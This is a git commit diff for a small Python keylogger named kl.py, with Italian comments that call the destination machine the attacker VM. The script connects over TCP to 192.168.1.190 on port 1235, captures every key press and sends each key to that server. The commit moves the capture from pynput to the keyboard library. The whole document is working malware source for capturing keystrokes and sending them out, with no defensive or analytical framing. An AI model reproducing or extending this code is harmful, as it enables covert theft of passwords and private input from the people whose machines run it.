08d4297429c3033d15c36d6d71f04ed2ad4b22cd
the-starkster <64413171+the-starkster@users.noreply.github.com>
2024-08-07 16:07:03 +0200

    miglioramenti 2

--- kl.py
+++ kl.py
@@ -1,5 +1,5 @@
 import socket
-from pynput import keyboard
+import keyboard
 
 # Configura l'indirizzo IP e la porta del server di destinazione (VM attaccante)
 SERVER_IP = '192.168.1.190'
@@ -9,17 +9,15 @@ SERVER_PORT = 1235
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((SERVER_IP, SERVER_PORT))
 
-def on_press(key):
-    try:
-        # Invio il carattere al server
-        sock.sendall(str(key.char).encode('utf-8'))
-    except AttributeError:
-        # Gestione dei tasti speciali (es: spazio, invio, etc.)
-        sock.sendall(str(key).encode('utf-8'))
+def on_key_event(event):
+    # Invio il carattere al server
+    sock.sendall(event.name.encode('utf-8'))
 
-# Avvia il listener della tastiera
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+# Imposta il listener della tastiera
+keyboard.on_press(on_key_event)
+
+# Mantiene il programma in esecuzione
+keyboard.wait()
 
 # Chiude la connessione socket quando il listener si interrompe
 sock.close()
